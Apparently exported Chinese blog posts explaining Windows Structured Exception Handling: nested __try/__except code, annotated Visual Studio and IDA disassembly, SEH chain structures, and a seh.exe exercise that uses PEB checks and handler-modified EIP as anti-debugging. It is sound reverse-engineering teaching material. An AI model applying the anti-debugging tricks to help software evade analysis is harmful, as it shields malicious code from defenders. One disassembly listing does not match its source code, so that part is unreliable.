ExceptionFilter()6\t&#123;7\t    return EXCEPTION_CONTINUE_EXECUTION;8\t&#125;910\tvoid PEB()11\t&#123;12\t\t_try                               //进入第一个 __try 域13\t\t&#123;   14\t\t\t//异常点A15\t\t&#125;16\t\t_except(EXCEPTION_EXECUTE_HANDLER)     // 第一个过滤表达式17\t\t&#123;18\t\t\tprintf(&quot;异常处理函数A\\n&quot;);           // 第一个 __except 处理域19\t\t&#125;2021\t\t_try   //进入第二个 __try 域22\t\t&#123;   23\t\t\t//异常点B24\t\t\t_try  //进入第三个 __try 域25\t\t\t&#123;   26\t\t\t\t//异常点C\t27\t\t\t&#125;28\t\t\t_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)                       // 第三个过滤表达式29\t\t\t&#123;30\t\t\t\t\tprintf(&quot;异常处理函数C \\n&quot;);    // 第三个 __except 处理域31\t\t\t&#125;32\t\t&#125;33\t\t\t_except(ExceptionFilter())           // 第二个过滤表达式34\t\t&#123;35\t\t\tprintf(&quot;异常处理函数B\\n&quot;);             // 第二个 __except 处理域36\t\t&#125;37\t&#125;3839\tint _tmain(int argc, TCHAR* argv[])40\t&#123;41 \t    PEB();4243\t    printf(&quot;\\npress any key to quit...\\n&quot;);44\t    _gettch();45\t46\t    return 0;47\t&#125;\n\nPEB()函数汇编代码汇编中[EBP-4]就是执向ExceptionRegistration-&gt;trylevel\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138    10: void PEB()    11: &#123;004548E0  push        ebp  004548E1  mov         ebp,esp ; push ExceptionRegistration-&gt;trylevel = TRYLEVEL_INVALID (-2)004548E3  push        0FFFFFFFEh; push ExceptionRegistration-&gt;scopetable004548E5  push        51A090h; push ExceptionRegistration-&gt;handler004548EA  push        offset _except_handler4 (0459130h)  004548EF  mov         eax,dword ptr fs:[00000000h]; push _EXCEPTION_REGISTRATION::prev004548F5  push        eax; 这里分配了 0xd8 字节的栈空间，其中紧贴着ExceptionRegistration-&gt;prev; 的4个字节存放着ExceptionRegistration-&gt;xpointers004548F6  add         esp,0FFFFFF28h  004548FC  push        ebx  004548FD  push        esi  004548FE  push        edi  004548FF  lea         edi,[ebp-28h]  00454902  mov         ecx,4  00454907  mov         eax,0CCCCCCCCh  0045490C  rep stos    dword ptr es:[edi]0045490E  mov         eax,dword ptr [__security_cookie (051B004h)]; 对 scopetable 进行异或加密00454913  xor         dword ptr [ebp-8],eax; 对 __security_cookie 进行加密00454916  xor         eax,ebp; 把加密了的 __security_cookie 也压入栈中，后面用来对 scopetable 进行解密00454918  push        eax  00454919  lea         eax,[ebp-10h]; 将ExceptionRegistration 挂入线程异常链表中0045491C  mov         dword ptr fs:[00000000h],eax  00454922  mov         dword ptr [ebp-18h],esp  00454925  mov         ecx,offset _787D2F6E_StaAD_PEB@cpp (051F01Bh)  0045492A  call        @__CheckForDebuggerJustMyCode@4 (0450C42h)      12: \t_try; 进入第一个 __try 域，ExceptionRegistration-&gt;trylevel = 00045492F  mov         dword ptr [ebp-4],0      13: \t&#123;    14: \t\t//异常点A    15: \t&#125;; 离开第一个 __try 域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2)00454936  mov         dword ptr [ebp-4],0FFFFFFFEh  0045493D  jmp         PEB+7Ch (045495Ch)      16: \t_except(EXCEPTION_EXECUTE_HANDLER); 第一个过滤表达式; EXCEPTION_EXECUTE_HANDLER==10045493F  mov         eax,1   00454944  ret; 第一个 __except 处理域00454945  mov         esp,dword ptr [ebp-18h]      17: \t&#123;    18: \t\tprintf(&quot;异常处理函数A\\n&quot;);00454948  push        offset string &quot;IsDebuggerPresent() = %d\\n&quot; (04F4E60h)  0045494D  call        _printf (044EA5Ah)  00454952  add         esp,4      13: \t&#123;    14: \t\t//异常点A    15: \t&#125;; 离开第一个 __except域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2)00454955  mov         dword ptr [ebp-4],0FFFFFFFEh      19: \t&#125;    20:     21: \t_try; 进入第二个 __try 域，ExceptionRegistration-&gt;trylevel = 10045495C  mov         dword ptr [ebp-4],1      22: \t&#123;    23: \t\t//异常点B    24: \t\t_try; 进入第三个 __try 域，ExceptionRegistration-&gt;trylevel = 200454963  mov         dword ptr [ebp-4],2      25: \t\t&#123;    26: \t\t\t//异常点C\t    27: \t\t&#125;; 离开第三个 __try 域，ExceptionRegistration-&gt;trylevel = 10045496A  mov         dword ptr [ebp-4],1  00454971  jmp         PEB+0E0h (04549C0h)      28: \t\t_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH); 第三个过滤表达式00454973  mov         eax,dword ptr [ebp-14h]  00454976  mov         ecx,dword ptr [eax]  00454978  mov         edx,dword ptr [ecx]  0045497A  mov         dword ptr [ebp-0E0h],edx  00454980  cmp         dword ptr [ebp-0E0h],0C0000094h  0045498A  jne         PEB+0B8h (0454998h)  0045498C  mov         dword ptr [ebp-0E8h],1  00454996  jmp         PEB+0C2h (04549A2h)  00454998  mov         dword ptr [ebp-0E8h],0  004549A2  mov         eax,dword ptr [ebp-0E8h]  004549A8  ret; 第三个 __except 处理域004549A9  mov         esp,dword ptr [ebp-18h]      29: \t\t&#123;    30: \t\t\t\tprintf(&quot;异常处理函数C \\n&quot;);004549AC  push        offset string &quot;\\xd2\\xec\\xb3\\xa3\\xb4\\xa6\\xc0\\xed\\xba\\xaf\\xca\\xfdC \\n&quot; (04F4E80h)  004549B1  call        _printf (044EA5Ah)  004549B6  add         esp,4      25: \t\t&#123;    26: \t\t\t//异常点C\t    27: \t\t&#125;; 离开第三个__except 处理域域，ExceptionRegistration-&gt;trylevel = 1 004549B9  mov         dword ptr [ebp-4],1      31: \t\t&#125;    32: \t&#125;; 离开第二个 __try 域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2)004549C0  mov         dword ptr [ebp-4],0FFFFFFFEh  004549C7  jmp         $LN14+17h (04549E6h)      33: \t\t_except(ExceptionFilter()); 第二个过滤表达式    004549C9  call        ExceptionFilter (045144Eh)004549CE  ret; 第二个 __except 处理域004549CF  mov         esp,dword ptr [ebp-18h]      34: \t&#123;    35: \t\tprintf(&quot;异常处理函数B\\n&quot;);004549D2  push        offset string &quot;  =&gt; Not debugging...\\n\\n&quot; (04F4E98h)  004549D7  call        _printf (044EA5Ah)  004549DC  add         esp,4      31: \t\t&#125;    32: \t&#125;; 离开第二个 __except域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2)004549DF  mov         dword ptr [ebp-4],0FFFFFFFEh      36: \t&#125;    37: &#125;004549E6  mov         ecx,dword ptr [ebp-10h]; 恢复旧的 EXCEPTION_REGISTRATION。即从线程异常链表中摘除ExceptionRegistration004549E9  mov         dword ptr fs:[0],ecx  004549F0  pop         ecx  004549F1  pop         edi  004549F2  pop         esi  004549F3  pop         ebx  004549F4  add         esp,0E8h  004549FA  cmp         ebp,esp  004549FC  call        __RTC_CheckEsp (044FF09h)  00454A01  mov         esp,ebp  00454A03  pop         ebp  00454A04  ret \n\n\n\nida汇编结果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110.text:00401040 ; __unwind &#123; // __except_handler4.text:00401040                 push    ebp.text:00401041                 mov     ebp, esp.text:00401043                 push    0FFFFFFFEh      ; push ExceptionRegistration-&gt;trylevel = TRYLEVEL_INVALID (-2).text:00401045                 push    offset stru_4172A8 ; push ExceptionRegistration-&gt;scopetable.text:0040104A                 push    offset __except_handler4 ; push ExceptionRegistration-&gt;handler.text:0040104F                 mov     eax, large fs:0.text:00401055                 push    eax             ; push _EXCEPTION_REGISTRATION::prev.text:00401056                 sub     esp, 8.text:00401059                 push    ebx.text:0040105A                 push    esi.text:0040105B                 push    edi.text:0040105C                 mov     eax, ___security_cookie.text:00401061                 xor     [ebp+ms_exc.registration.ScopeTable], eax ; 对 scopetable([EBP-8]) 进行异或加密.text:00401064                 xor     eax, ebp        ; 对 __security_cookie 进行加密.text:00401066                 push    eax             ; 把加密了的 __security_cookie 也压入栈中，后面用来对 scopetable 进行解密.text:00401067                 lea     eax, [ebp+ms_exc.registration] ; [EBP-10h].text:0040106A                 mov     large fs:0, eax ; 将ExceptionRegistration 挂入线程异常链表中.text:00401070                 mov     [ebp+ms_exc.old_esp], esp.text:00401073 ;   __try &#123; // __except at loc_401082.text:00401073                 mov     [ebp+ms_exc.registration.TryLevel], 0 ; 进入第一个 __try 域，ExceptionRegistration-&gt;trylevel = 0.text:0040107A                 jmp     short loc_401092 ; 未发生异常，离开第一个 __try/__except 域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2).text:0040107C ; ---------------------------------------------------------------------------.text:0040107C.text:0040107C loc_40107C:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:0040107C ;   __except filter // owned by 401073  ; EXCEPTION_EXECUTE_HANDLER==1,第一个过滤表达式.text:0040107C                 mov     eax, 1.text:00401081                 retn.text:00401082 ; ---------------------------------------------------------------------------.text:00401082.text:00401082 loc_401082:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:00401082 ;   __except(loc_40107C) // owned by 401073 ; 第一个 __except 处理域.text:00401082                 mov     esp, [ebp+ms_exc.old_esp].text:00401085                 push    offset aA       ; &quot;异常处理函数A\\n&quot;.text:0040108A                 call    sub_401010.text:0040108F                 add     esp, 4.text:0040108F ;   &#125; // starts at 401073.text:00401092.text:00401092 loc_401092:                             ; CODE XREF: sub_401040+3A↑j.text:00401092                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ; 离开第一个 __try/__except 域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2).text:00401099 ;   __try &#123; // __except at loc_4010E0.text:00401099                 mov     [ebp+ms_exc.registration.TryLevel], 1 ; 进入第二个 __try 域，ExceptionRegistration-&gt;trylevel = 1.text:00401099 ;   &#125; // starts at 401099.text:004010A0 ;   __try &#123; // __except at loc_4010C3.text:004010A0 ;     __try &#123; // __except at loc_4010E0.text:004010A0                 mov     [ebp+ms_exc.registration.TryLevel], 2 ;  进入第三个 __try 域，ExceptionRegistration-&gt;trylevel = 2.text:004010A0 ;     &#125; // starts at 4010A0.text:004010A0 ;   &#125; // starts at 4010A0.text:004010A7 ;   __try &#123; // __except at loc_4010E0.text:004010A7                 mov     [ebp+ms_exc.registration.TryLevel], 1 ; 离开第三个 __try 域，ExceptionRegistration-&gt;trylevel = 1.text:004010AE                 jmp     short loc_4010F0 ;  未发生异常，离开第二个 __except域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2).text:004010B0 ; ---------------------------------------------------------------------------.text:004010B0.text:004010B0 loc_4010B0:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:004010B0 ;   __except filter // owned by 4010A0  ; 第三个过滤表达式.text:004010B0                 mov     eax, [ebp+ms_exc.exc_ptr].text:004010B3                 mov     eax, [eax].text:004010B5                 xor     ecx, ecx.text:004010B7                 cmp     dword ptr [eax], 0C0000094h.text:004010BD                 setz    cl.text:004010C0                 mov     eax, ecx.text:004010C2                 retn.text:004010C3 ; ---------------------------------------------------------------------------.text:004010C3.text:004010C3 loc_4010C3:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:004010C3 ;   __except(loc_4010B0) // owned by 4010A0 ; 第三个 __except 处理域.text:004010C3                 mov     esp, [ebp+ms_exc.old_esp].text:004010C6                 push    offset aC       ; &quot;异常处理函数C \\n&quot;.text:004010CB                 call    sub_401010.text:004010D0                 add     esp, 4.text:004010D0 ;   &#125; // starts at 4010A7.text:004010D3 ;   __try &#123; // __except at loc_4010E0.text:004010D3                 mov     [ebp+ms_exc.registration.TryLevel], 1 ; 离开第三个__except 处理域域，ExceptionRegistration-&gt;trylevel = 1.text:004010DA                 jmp     short loc_4010F0 ;  离开第二个 __except域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2).text:004010DC ; ---------------------------------------------------------------------------.text:004010DC.text:004010DC loc_4010DC:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:004010DC ;   __except filter // owned by 401099  ; 第二个过滤表达式.text:004010DC ;   __except filter // owned by 4010A0.text:004010DC ;   __except filter // owned by 4010A7.text:004010DC ;   __except filter // owned by 4010D3.text:004010DC                 or      eax, 0FFFFFFFFh.text:004010DF                 retn.text:004010E0 ; ---------------------------------------------------------------------------.text:004010E0.text:004010E0 loc_4010E0:                             ; DATA XREF: .rdata:stru_4172A8↓o.text:004010E0 ;   __except(loc_4010DC) // owned by 401099 ; 第二个 __except 处理域.text:004010E0 ;   __except(loc_4010DC) // owned by 4010A0.text:004010E0 ;   __except(loc_4010DC) // owned by 4010A7.text:004010E0 ;   __except(loc_4010DC) // owned by 4010D3.text:004010E0                 mov     esp, [ebp+ms_exc.old_esp].text:004010E3                 push    offset aB       ; &quot;异常处理函数B\\n&quot;.text:004010E8                 call    sub_401010.text:004010ED                 add     esp, 4.text:004010ED ;   &#125; // starts at 4010D3.text:004010F0.text:004010F0 loc_4010F0:                             ; CODE XREF: sub_401040+6E↑j.text:004010F0                                         ; sub_401040+9A↑j.text:004010F0                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ;  离开第二个 __except域，ExceptionRegistration-&gt;trylevel = TRYLEVEL_NONE (-2).text:004010F7                 mov     ecx, [ebp+ms_exc.registration.Next] ; 恢复旧的 EXCEPTION_REGISTRATION。即从线程异常链表中摘除ExceptionRegistration.text:004010FA                 mov     large fs:0, ecx.text:00401101                 pop     ecx.text:00401102                 pop     edi.text:00401103                 pop     esi.text:00401104                 pop     ebx.text:00401105                 mov     esp, ebp.text:00401107                 pop     ebp.text:00401108                 retn.text:00401108 ; &#125; // starts at 401040.text:00401108 sub_401040      endp\n\nida识别的scopetable![image-20240117174244779](.&#x2F;基于Visual Stdio 2019的例子&#x2F;ida识别的scopetable.png)\n参考链接__try __except与__try __finally的嵌套使用以及__finally的调用时机\nx64位汇编学习(三)、异常\nSEH\n编译器扩展SEH\n_try_except本质\n局部展开与全局展开\n15pb调试器学习总结_except_handler4以及栈展开分析 \nSEH分析笔记（X86篇）\n","slug":"编译器扩展的SEH","date":"2022-04-25T13:28:03.000Z","categories_index":"","tags_index":"Windows异常处理机制","author_index":"0netry"},{"id":"b42df1b10b510ae71ca0bc4d234a8f72","title":"SEH","content":"SEH是Windows操作系统提供的异常处理机制，在程序源代码中使用__try、__except、__finally关键字来具体实现。\n初识SEH下面将通过一个例子来认识SEH（基于Windows10的练习）\nseh.exe程序故意触发了内存非法访问（Memory Access Violation）异常，然后通过SEH机制来处理该异常。并且使用PEB信息向程序添加简单的反调试代码，使程序在正常运行与调试运行时表现出不同的行为动作。\n1.正常运行\n首先直接双击运行seh.exe程序，弹出一个消息框，显示”Hello :)”字符串\n\n\n\n\n\n\n\n\n\n表面上程序正常运行，其实进程内部已经发生了异常，但由于使用SEH机制进行了处理，所以程序正常运行。\n\n2.调试运行\n使用x32dbg调试器打开seh.exe程序并点击运行键，发生非法访问异常后暂停调试。\n如下图所示，401019地址处添加的MOV DWORD PTR DS:[EAX],1指令用来触发异常，当前EAX寄存器的值为0，所以该指令的实际含义是向内存地址0处写入值1.但试图向尚未分配的内存地址0写入某个值时，就会触发内存非法访问异常。\n\n\n\n\n\n\n\n\n\n内存地址0虽然属于seh.exe进程的用户内存区域，但由于是未分配的空间，所以无法随意访问。\n\n继续运行，就会弹出消息框显示”Debugger detected :)”\n\nOS的异常处理办法正常运行时的异常处理方法进程运行过程中若发生异常，OS会委托进程处理。若进程代码中存在具体的异常处理（如SEH异常处理器）代码，则能顺利处理相关异常，程序继续运行。但如果进程内部没有具体实现SEH，那么相关异常就无法处理，OS就会启动默认的异常处理机制，终止进程运行（如下图Windows7的默认异常处理机制）\n\n调试运行时的异常处理方法调试运行中发生异常时，处理方法与上面有些不同。若被调试进程内部发生异常，OS会首先把异常抛给调试进程处理。调试器几乎拥有被调试者的所有权限，它不仅可以运行、终止被调试者，还拥有被调试进程的虚拟内存、寄存器的读写权限。需要特别指出的是，被调试者内部发生的所有异常（错误）都由调试器处理。所以调试过程中发生的所有异常（错误）都要先交由调试器管理（被调试者的SEH依据优先顺序推给调试器）。像这样，被调试者发生异常时，调试器就会暂停运行，必须采取某种措施来处理异常，完成后继续调试。遇到异常时经常采用的几种处理方法如下所示。（1） 直接修改异常：代码、寄存器、内存被调试者发生异常时，调试器会在发生异常的代码处暂停，此时可以通过调试器直接修改有问题的代码、寄存器、内存等，排除异常后，调试器继续运行程序。\n\n\n\n\n\n\n\n\n\n遇到初始SEH中例子的异常时，采用直接修改异常的方法进行如下处理：\n（1）由于EAX寄存器所指的地址值错误，所以只要把EAX寄存器的值修改为有效的内存地址即可。\n（2）由于401019地址处的代码触发了异常，使用调试器的汇编功能将相关代码修改为NOP指令，运行后也可排除异常。\n（3）也可以使用Ollydbg的New Origin here（或在x32dbg汇编窗口右键选择在此设置EIP）功能改变程序的运行路径（因为无法直接修改EIP寄存器，所以需要借助该功能修改）\n（2）将异常抛给被调试者处理\n如果被调试者内部存在SEH（异常处理函数）能够处理异常，那么异常通知会发送给被调试者，由被调试者自行处理。这与程序正常运行时异常处理方式是一样的（使用Ollydbg中的Shift+F7&#x2F;F8&#x2F;&#x2F;F9命令可以直接将当前异常抛还给被调试者）。\n（3）OS默认的异常处理机制\n若调试器与被调试者都无法处理（或故意不处理）当前发生的异常，则OS默认的异常处理机制会处理它，终止被调试进程，同时结束调试。\n异常操作系统中定义的异常如下：\n123456789101112131415161718192021EXCEPTION_DATATYPE_MISALIGNMENT     (0x80000002)    EXCEPTION_BREAKPOINT                (0x80000003)    EXCEPTION_SINGLE_STEP               (0x80000004) EXCEPTION_ACCESS_VIOLATION          (0xC0000005)    EXCEPTION_IN_PAGE_ERROR             (0xC0000006)       EXCEPTION_ILLEGAL_INSTRUCTION       (0xC000001D)    EXCEPTION_NONCONTINUABLE_EXCEPTION  (0xC0000025)    EXCEPTION_INVALID_DISPOSITION       (0xC0000026)    EXCEPTION_ARRAY_BOUNDS_EXCEEDED     (0xC000008C)    EXCEPTION_FLOAT_DENORMAL_OPERAND    (0xC000008D)    EXCEPTION_FLOAT_DIVIDE_BY_ZERO      (0xC000008E)    EXCEPTION_FLOAT_INEXACT_RESULT      (0xC000008F)    EXCEPTION_FLOAT_INVALID_OPERATION   (0xC0000090)    EXCEPTION_FLOAT_OVERFLOW            (0xC0000091)    EXCEPTION_FLOAT_STACK_CHECK         (0xC0000092)    EXCEPTION_FLOAT_UNDERFLOW           (0xC0000093)    EXCEPTION_INTEGER_DIVIDE_BY_ZERO    (0xC0000094)    EXCEPTION_INTEGER_OVERFLOW          (0xC0000095)    EXCEPTION_PRIVILEGED_INSTRUCTION    (0xC0000096)    EXCEPTION_STACK_OVERFLOW            (0xC00000FD)                                                                        出处：SDK的winnt.h\n\n5种代表性异常EXCEPTION_ACCESS_VIOLATION(0xC0000005)试图访问不存在或不具访问权限的内存区域时，就会发生EXCEPTION_ACCESS_VIOLATION（非法访问异常）。\n例子\n12345678MOV DWORD PTR DS:[0],1-&gt; 内存地址0处是尚未分配的区域ADD DWORD PTR DS:[401000],1-&gt; .text节区的起始地址401000仅具有&quot;读&quot;权限（无&quot;写&quot;权限）XOR DWORD PTR DS:[80000000],1234-&gt; 内存地址80000000属于内核区域，用户模式下无法访问\n\nEXCEPTION_BREAKPOINT(0x80000003)在运行代码中设置断点后，CPU尝试执行该地址处的指令时，将发生EXCEPTION_BREAKPOINT异常。\nEXCEPTION_ILLEGAL_INSTRUCTION(0xC000001D)CPU遇到无法解析的指令时引发该异常。比如”0FFF”指令在x86 CPU中未定义，CPU遇到该指令将引发EXCEPTION_ILLEGAL_INSTRUCTION异常。\nEXCEPTION_INTEGER_DIVIDE_BY_ZERO(0xC0000094)INTEGER（整数）除法运算中，若分母为0（即被0除），则引发EXCEPTION_INTEGER_DIVIDE_BY_ZERO异常。\nEXCEPTION_SINGLE_STEP(0x80000004)Single Step（单步）的含义是执行一条指令，然后暂停。CPU进入到单步模式后，每执行一条指令就会引发EXCEPTION_SINGLE_STEP异常，暂停运行。将EFLAGS寄存器的TF（Trap Flag，陷阱标志）位设置为1后，CPU就会进入单步工作模式。\nSEH详细说明SEH链SEH以链的形式存在。第一个异常处理器中若未处理相关异常，它就会被传递给下一个异常处理器，直到得到处理。从技术层面来看，SEH是由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表。其定义如下：\n使用Windbg命令dt _EXCEPTION_REGISTRATION_RECORD查看_EXCEPTION_REGISTRATION_RECORD结构体\n12340: kd&gt; dt _EXCEPTION_REGISTRATION_RECORDntdll!_EXCEPTION_REGISTRATION_RECORD   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION \n\n定义：\n1234typedef struct _EXCEPTION_REGISTRATION_RECORD&#123;\tPEXCEPTION_REGISTRATION_RECORD Next;    PEXCEPTION_DISPOSITION Handler; &#125;EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;\n\nNext成员是指向下一个_EXCEPTION_REGISTRATION_RECORD结构体的指针，Handler成员是异常处理函数（异常处理器）。若Next成员的值为FFFFFFFF，则表示它是链表的最后一个结点。SEH链结构如下：\n\n图中共存在3个SEH（异常处理器），发生异常时，该异常会按照（A）-&gt;（B）-&gt;（C）的顺序依次传递，直到有异常处理器处理。\n异常处理函数的定义函数定义SEH异常处理函数（SEH函数）的定义如下：\n123456EXCEPTION_DISPOSITION _except_handler(\tEXCEPTION_RECORD *pRecord,\tEXCEPTION_REGISTRATION_RECORD *pFrame,\tCONTEXT *pContext,\tPVOID pValue);\n\n异常处理函数（异常处理器）接收4个参数输入，返回名为EXCEPTION_DISPOSITION的枚举类型。该异常处理函数由系统调用，是一个回调函数，系统调用它时会给出上述定义的4个参数，这4个参数中保存着与异常相关的信息，首先，第一个参数是指向EXCEPTION_RECORD结构体的指针，EXCEPTION_RECORD结构体的定义如下：\n第一个参数：EXCEPTION_RECORD结构体使用Windbg命令dt _EXCEPTION_RECORD查看如下\n123456780: kd&gt; dt _EXCEPTION_RECORDntdll!_EXCEPTION_RECORD   +0x000 ExceptionCode    : Int4B   +0x004 ExceptionFlags   : Uint4B   +0x008 ExceptionRecord  : Ptr32 _EXCEPTION_RECORD   +0x00c ExceptionAddress : Ptr32 Void   +0x010 NumberParameters : Uint4B   +0x014 ExceptionInformation : [15] Uint4B\n\n定义如下\n12345678typedef struct _EXCEPTION_RECORD&#123;\t DWORD ExceptionCode;                           //异常代码     DWORD ExceptionFlags;     struct _EXCEPTION_RECORD *ExceptionRecord;        PVOID ExceptionAddress;                       //异常发生地址     DWORD NumberParameters;     ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];                                                                          //EXCEPTION_MAXIMUM_PARAMETERS=15&#125;EXCEPTION_RECORD,*PEXCEPTION_RECORD;  \n\n结构体中ExceptionCode成员用来指出异常类型，ExceptionAddress成员表示发生异常的代码地址\n第三个参数：CONTEXT结构体使用Windbg命令dt _CONTEXT查看CONTEXT结构体如下：\n1234567891011121314151617181920212223242526270: kd&gt; dt _CONTEXTntdll!_CONTEXT   +0x000 ContextFlags     : Uint4B   +0x004 Dr0              : Uint4B   +0x008 Dr1              : Uint4B   +0x00c Dr2              : Uint4B   +0x010 Dr3              : Uint4B   +0x014 Dr6              : Uint4B   +0x018 Dr7              : Uint4B   +0x01c FloatSave        : _FLOATING_SAVE_AREA   +0x08c SegGs            : Uint4B   +0x090 SegFs            : Uint4B   +0x094 SegEs            : Uint4B   +0x098 SegDs            : Uint4B   +0x09c Edi              : Uint4B   +0x0a0 Esi              : Uint4B   +0x0a4 Ebx              : Uint4B   +0x0a8 Edx              : Uint4B   +0x0ac Ecx              : Uint4B   +0x0b0 Eax              : Uint4B   +0x0b4 Ebp              : Uint4B   +0x0b8 Eip              : Uint4B   +0x0bc SegCs            : Uint4B   +0x0c0 EFlags           : Uint4B   +0x0c4 Esp              : Uint4B   +0x0c8 SegSs            : Uint4B   +0x0cc ExtendedRegisters : [512] UChar\n\nCONTEXT结构体定义如下：\n12345678910111213141516171819202122232425262728struct CONTEXT&#123;   DWORD ContextFlags；   DWORD Dr0;              // 04h   DWORD Dr1;              // 08h   DWORD Dr2;              // 0Ch   DWORD Dr3;              // 10h   DWORD Dr6;              // 14h   DWORD Dr7;              // 18h   FLOATING_SAVE_AREA FloatSave;   DWORD SegGs;            // 8Ch   DWORD SegFs;            // 90h   DWORD SegEs;            // 94h   DWORD SegDs;            // 98h   DWORD Edi;              // 9Ch   DWORD Esi;              // A0h   DWORD Ebx;              // A4h   DWORD Edx;              // A8h   DWORD Ecx;              // ACh   DWORD Eax;              // B0h   DWORD Ebp;              // B4h   DWORD Eip;              // B8h   DWORD SegCs;            // BCh(must be sanitized)   DWORD EFlags;           // C0h   DWORD Esp;              // C4h   DWORD SegSs;            // C8h   BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];                            // MAXIMUM_SUPPORTED_EXTENSION=512&#125;;\n\nCONTEXT结构体用来备份CPU寄存器的值，因为多线程环境下需要这样做。每个线程内部都拥有1个CONTEXT结构体。CPU暂时离开当前线程去运行其他线程时，CPU寄存器的值就会保存到当前线程的CONTEXT结构体；CPU再次运行该线程时，会使用保存在CONTEXT结构体的值来覆盖CPU寄存器的值，然后从之前暂停的代码处继续执行。通过这种方式，OS可以在多线程环境下安全运行各线程。\n异常函数处理流程异常发生时，执行异常代码的线程就会中断运行，转而运行SEH（异常处理器&#x2F;异常处理函数），此时OS会把线程的CONTEXT结构体的指针传递给异常处理函数（异常处理器）的相应参数。代码48-6的结构体成员中有1个Eip成员（偏移量：B8）。在异常处理函数中将参数传递过来的CONTEXT.Eip设置为其他地址，然后返回异常处理函数。这样，之前暂停的线程会执行新设置的EIP地址处的代码（反调试中经常采用这一技术，练习示例seh.exe中也采用了该技术，后面会详细分析）。\n异常函数的返回值异常处理函数的返回值为EXCEPTION_DISPOSITION枚举类型，下面了解一下该类型。\n使用Windbg命令dt _EXCEPTION_DISPOSITION查看EXCEPTION_DISPOSITION枚举类型：\n1234560: kd&gt; dt _EXCEPTION_DISPOSITIONntdll!_EXCEPTION_DISPOSITION   ExceptionContinueExecution = 0n0   ExceptionContinueSearch = 0n1   ExceptionNestedException = 0n2   ExceptionCollidedUnwind = 0n3\n\nEXCEPTION_DISPOSITION枚举类型的定义：\n123456typedef enum _EXCEPTION_DISPOSITION&#123;\tExceptionContinueExecution = 0,    //继续执行异常代码    ExceptionContinueSearch = 1,       //运行下一个异常处理函数    ExceptionNestedException = 2,      //在OS内部使用    ExceptionCollidedUnwind = 3        //在OS内部使用&#125;EXCEPTION_DISPOSITION;   \n\n异常处理器处理异常后会返回ExceptionContinueExecution（0），从发生异常的代码处继续运行。若当前异常处理器无法处理异常，则返回ExceptionContinueSearch（1），将异常派送到SEH链的下一个异常处理器。\nSEH链的访问通过TEB结构体的NtTib成员可以访问进程的SEH链。\n如下图所示，TEB.NtTib.ExceptionList成员是TEB结构体的第一个成员。FS段寄存器指向段内存的起始地址，TEB结构体即位于此，所以通过TEB.NtTib.ExceptionList&#x3D;FS:[0]可以获取TEB.NtTib.ExceptionList的地址。\n\nSEH安装方法在C语言中使用__try、__except、__finally关键字就可以向代码添加SEH。在汇编语言中添加SEH的方法如下：\n123PUSH @MyHandler                  ;异常处理函数地址PUSH DWORD PTR FS:[0]            ;Head Of SEH Linked ListMOV DWORD PTR FS:[0],ESP         ;添加链表\n\n“在程序代码中安装SEH”就是将自身的异常处理器添加到已有的SEH链。从技术层面讲，就是将自身的EXCEPTION_REGISTRATION_RECORD结构体链接到EXCEPTION_REGISTRATION_RECORD结构体链表。\n基于Windows10的练习1.安装SEH首先使用x32dbg打开seh.exe，运行到401000地址处（seh.exe的main函数），如下图所示，401000、401005、40100C地址处的三条指令即为安装SEH的过程，新添加的异常处理器就是位于40105A的异常处理函数。\n\n2.查看SEH链①运行代码到401005地址处，查看FS:[0]的值，其值就是SEH链的起始地址。\n下图中，从代码信息窗口中可以看到，FS:[0]&#x3D;[00270000]&#x3D;0019FF60，其中0019FF60就是SEH链的起始地址（即EXCEPTION_REGISTRATION_RECORD结构体链表的起始地址）。从栈窗口中查看地址0019FF60，可以发现第一个EXCEPTION_REGISTRATION_RECORD结构体（Next&#x3D;0019FFCC，Handler&#x3D;00402730）。异常处理器地址00402730存在于seh.exe进程的代码节区（该异常处理器是VC++生成PE文件时默认添加到其启动函数的）。\n\n②接着在栈窗口中转到0019FFCC地址处。查看链表中的第二个EXCEPTION_REGISTRATION_RECORD结构体（Next&#x3D;0019FFE4，Handler&#x3D;7729AF30），再转到地址0019FFE4处，查看链表中的第三个EXCEPTION_REGISTRATION_RECORD结构体（Next&#x3D;FFFFFFFF，Handler&#x3D;772ABC21），第三个EXCEPTION_REGISTRATION_RECORD结构体的Next为FFFFFFFF，所以第三个EXCEPTION_REGISTRATION_RECORD结构体也是SEH链表的最后一个结构体。异常处理地址为772ABC21，它位于ntdll.dll模块的代码区域，是OS默认的异常处理器（创建进程时，OS会自动产生默认的SEH）\n\n3.添加SEH运行401005和40100C地址处的PUSH DWORD PTR FS:[0]、MOV DWORD PTR 